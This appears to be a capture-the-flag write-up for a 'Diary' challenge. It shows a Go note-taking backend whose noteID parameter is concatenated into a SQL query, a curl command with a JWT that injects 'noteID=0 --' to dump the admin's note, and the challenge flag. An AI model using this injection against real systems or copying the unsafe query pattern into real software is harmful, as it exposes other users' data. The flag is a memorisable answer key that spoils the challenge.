# Scan

Scanning the server has 2 ports that has a related webserver running: `23689` and `42069`. There are 2 Diary challenges which are almost identical.

Later it turns out that `42069` belongs to the first challenge.

# Website

It has a website with accounts and note creation. 

![](screenshots/1.png)

The notes are created with markdown syntax.


![](screenshots/2.png)

After creating a note, it can be viewed as pdf.

The flag is stored in the `admin` user's note. 

# PDF generation

The backend is written in go and handling the accounts and notes. The pdf is generated with a markdown to html and html to pdf all inside the go program.

Both the html and pdf generation libraries are quite basic. After chefcking the source code, there seems to be no parsing error or injection vector that could help there. 

# SQL injection

When rendering the notes, there is an option to inject in the noteID field, from directly the query parameters.

```go
func renderNote(w http.ResponseWriter, r *http.Request) {
  //redacted
	noteID := r.URL.Query().Get("noteID")
  //redacted
  go func() {
		var title string
		var content string
		err := db.QueryRow("SELECT title, content FROM notes WHERE id = "+noteID+" AND username = '"+username+"'").Scan(&title, &content)
    //redacted
		pdfBytes, err := renderPDF(title, content)
		queryResult <- struct {
			title     string
			content   string
			pdfBytes  []byte
			queryErr  error
			renderErr error
		}{title, content, pdfBytes, nil, err}
	}()
  //redacted
}

```

Registering as any user and grabbing an auth JWT token, it is possible to dump anyone's notes.

```bash
curl -v -G -X GET -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFhIiwiZXhwIjoxNzI3NzE3MTI0fQ.FG1U8dHq3La0h19zyGIYEeaka8bYR5dcexHqIa0w-6A' 'http://10.10.1.10:42069/notes/render' --data-urlencode 'noteID=0 --' --output ./flag.pdf
```

![](screenshots/3.png)

The exploit is not working on the other port, this is how you could differentiate which port belongs to which challenge.

# Flag

`CQ24{4nd_Th3rE_1_Th0ughT_r3gEx3s_4r3_s@f3}`